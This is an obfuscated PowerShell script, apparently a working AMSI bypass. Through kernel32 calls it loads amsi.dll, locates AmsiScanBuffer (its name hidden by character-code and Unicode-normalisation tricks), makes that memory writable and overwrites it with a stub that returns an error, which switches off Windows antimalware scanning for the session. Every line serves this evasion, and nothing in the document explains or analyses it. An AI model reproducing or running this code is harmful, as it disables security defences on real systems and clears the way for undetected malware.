$HpU1UXG7GepW = @"
using System;
using System.Runtime.InteropServices;
public class HpU1UXG7GepW {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr fOl6Jyxe, string bWvd0KkHcgN6Fukyc);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr xpl, UIntPtr eSjbd34kBc6no, uint tlu9aOD0NE, out uint UsIgMlKtAw01G8j);
}
"@

Add-Type $HpU1UXG7GepW

$Iwp48qSPho9_ZxtpFru = [HpU1UXG7GepW]::LoadLibrary("$([CHAr]([ByTe]0x61)+[CHaR](109*57/57)+[char]([byte]0x73)+[chAr](105+42-42)+[cHAr](46+17-17)+[CHaR](100)+[CHAR]([BYTE]0x6c)+[CHaR](108*51/51))")
$dKWE6wMhB0_ZjQ56 = [HpU1UXG7GepW]::GetProcAddress($Iwp48qSPho9_ZxtpFru, "$(('ÃmsìScànBúf'+'fér').NOrMaLIze([CHAr](70)+[chaR](111+85-85)+[cHar](26+88)+[cHaR](109)+[chaR](68+46-46)) -replace [CHar](92+87-87)+[chAR](112*97/97)+[chAr]([bYTe]0x7b)+[char](77*72/72)+[chAr]([bYTe]0x6e)+[CHAR](125+51-51))")
$p = 0
[HpU1UXG7GepW]::VirtualProtect($dKWE6wMhB0_ZjQ56, [uint32]5, 0x40, [ref]$p)
$SzLCu2Vm1LWtqUqurl = "0xB8"
$UhRAkezbupVApp = "0x57"
$aBB7XLOtz = "0x00"
$zmhhFGc7wp = "0x07"
$ShP9 = "0x80"
$l0_LJD3PhND9Y = "0xC3"
$Z13RkgRSnH1FITj9b = [Byte[]] ($SzLCu2Vm1LWtqUqurl,$UhRAkezbupVApp,$aBB7XLOtz,$zmhhFGc7wp,+$ShP9,+$l0_LJD3PhND9Y)
[System.Runtime.InteropServices.Marshal]::Copy($Z13RkgRSnH1FITj9b, 0, $dKWE6wMhB0_ZjQ56, 6)